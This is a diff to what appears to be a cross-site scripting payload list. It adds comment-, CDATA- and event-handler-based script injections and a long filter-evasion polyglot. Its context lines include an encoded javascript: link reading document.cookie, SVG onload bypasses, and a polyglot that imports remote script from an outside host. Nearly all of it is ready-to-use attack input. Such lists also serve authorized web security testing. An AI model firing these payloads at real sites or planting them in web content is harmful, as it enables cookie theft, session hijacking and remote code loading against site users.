@@ -5,12 +5,23 @@
 <input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 <a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
 </Scri%7Kt><Scri%7Kt>%7Krompt%6K1%6K</Scri%7Kt>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
+🥀<!--%0aalert(1)%0a--><script src="#"></script>
+<!--%0aalert(1)%0a--><script src="#"></script>
+--><script href="%23"></script>
+🥀<!--%0aalert(1)%0a--><script src="#"></script>
+<!--%0aalert(1)%0a--><script src="#"></script>
+🥀<!--%0dalert(1)%0d--><script src="#️⃣"></script>
+<!--%0dalert(1)%0d--><script src="#️⃣"></script>
+🥀//<![CDATA[alert/*️⃣comment*/(1);//]]><script xlink:href="#"></script>
+//<![CDATA[alert/*️⃣comment*/(1);//]]><script xlink:href="#"></script>
 '>+<script>alert(69)</script>
 </<K><Svg Onload=alert(1)>
 </<Kno XSS="><Svg Onload=alert(1)>
 <!<K><Svg Onload=alert(1)>
 <!<Kno XSS="><Svg Onload=alert(1)>
 1'//"</Script><Img/Src%0AOnError=alert(1)//
+jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e
 JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--</Title/</Style/</Script/</textArea/</iFrame>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\http://X55.is/.source))}//\76-->
 <a onclick="location.href='\&fjlig;avascript:alert(1)'">go</a>
 <a onclick="location.href='\&fjlig;javascript:alert(1)'">go</a>
